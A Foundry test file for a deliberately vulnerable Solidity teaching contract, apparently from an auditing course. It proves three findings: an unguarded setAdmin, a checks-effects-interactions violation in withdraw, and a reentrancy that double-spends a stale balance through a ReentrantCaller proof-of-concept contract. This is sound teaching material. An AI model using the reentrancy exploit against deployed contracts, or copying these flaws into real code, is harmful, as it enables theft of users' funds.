// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {stdError} from "forge-std/StdError.sol";
import {AuditLab} from "../src/AuditLab.sol";

/// @dev Reentrant caller for Finding 3: receive() fires mid-withdraw, while
///      the caller's balance is still stale (not yet decremented). The gift
///      takes exactly the balance the outer frame will NOT decrement
///      (bal - msg.value — the Ch 24 pattern).
contract ReentrantCaller {
    AuditLab internal lab;
    address internal victim;
    uint256 public staleBalanceSeen;

    constructor(AuditLab _lab) {
        lab = _lab;
    }

    /// @dev Honest funding path: forwards the caller's own ETH through the
    ///      lab's receive(), the audit-mandated deposit path.
    function deposit() external {
        (bool ok,) = address(lab).call{value: address(this).balance}("");
        require(ok, "deposit failed");
    }

    receive() external payable {
        uint256 bal = lab.balanceOf(address(this)); // STALE mid-withdraw
        staleBalanceSeen = bal;
        if (bal > msg.value) {
            lab.transferTo(victim, bal - msg.value);
        }
    }

    function attack(address _victim, uint256 amount) external {
        victim = _victim;
        lab.withdraw(amount);
    }
}

contract AuditLabTest is Test {
    AuditLab internal lab;

    function setUp() public {
        lab = new AuditLab();
    }

    /// @dev Finding 1 (Critical): anyone can become admin — the unguarded
    ///      admin key, the severity ladder's Critical example.
    function testFinding1AnyoneCanSetAdmin() public {
        vm.prank(address(0xBAD));
        lab.setAdmin(address(0xBAD));
        assertEq(lab.admin(), address(0xBAD));
    }

    /// @dev Finding 2 (Critical): CEI violation — the push (interaction)
    ///      precedes the decrement (effect). The push succeeds because the
    ///      lab holds ETH; the decrement then underflows (panic 0x11) because
    ///      amount > balance. The exact panic is asserted, pinning the
    ///      failure mode — a push-failure revert would fail this test.
    function testFinding2OverdrawUnderflows() public {
        address overdrawer = address(0xF2E5);
        lab.transferTo(overdrawer, 5 ether); // real balance: 5 ether
        vm.deal(address(lab), 10 ether); // the push can be covered
        vm.prank(overdrawer);
        vm.expectRevert(stdError.arithmeticError); // panic 0x11 on the decrement
        lab.withdraw(10 ether); // overdraw by 2x
    }

    /// @dev Finding 2b: legitimate withdraw succeeds (caller is an EOA with
    ///      a real balance, moved via transferTo).
    function testFinding2LegitimateWithdraw() public {
        lab.transferTo(address(0x0A7A), 10 ether); // deployer -> EOA
        vm.deal(address(lab), 10 ether);
        vm.prank(address(0x0A7A));
        lab.withdraw(10 ether);
        assertEq(lab.balanceOf(address(0x0A7A)), 0); // 10 - 10 = 0
    }

    /// @dev Finding 3 (Medium): transferTo credits the recipient before the
    ///      sender. A reentrant caller invokes transferTo mid-withdraw while
    ///      its balance is still stale (not yet decremented): the gift lands
    ///      AND the withdrawal completes — the same balance spent twice in
    ///      one transaction (balance drift). Against a CEI-fixed contract the
    ///      mid-call balance reads 5 ether and this test FAILS — the
    ///      re-audit evidence.
    function testFinding3OrderHazard() public {
        ReentrantCaller attacker = new ReentrantCaller(lab);
        address victim = address(0xABCD);

        vm.deal(address(attacker), 10 ether);
        attacker.deposit(); // balances[attacker] = 10; lab holds 10 ETH
        attacker.attack(victim, 5 ether); // withdraw -> reenters transferTo

        assertEq(attacker.staleBalanceSeen(), 10 ether, "stale balance read mid-withdraw");
        assertEq(lab.balanceOf(victim), 5 ether, "victim credited against the stale balance");
        assertEq(lab.balanceOf(address(attacker)), 0, "outer decrement charged too");
        assertEq(address(attacker).balance, 5 ether, "withdrawal completed");
        // drift: 5 ETH cashed out + 5 gifted = the full 10 ether balance,
        // both movements authorized by a single (stale) balance entry
        assertEq(lab.balanceOf(victim) + address(attacker).balance, 10 ether);
    }
}
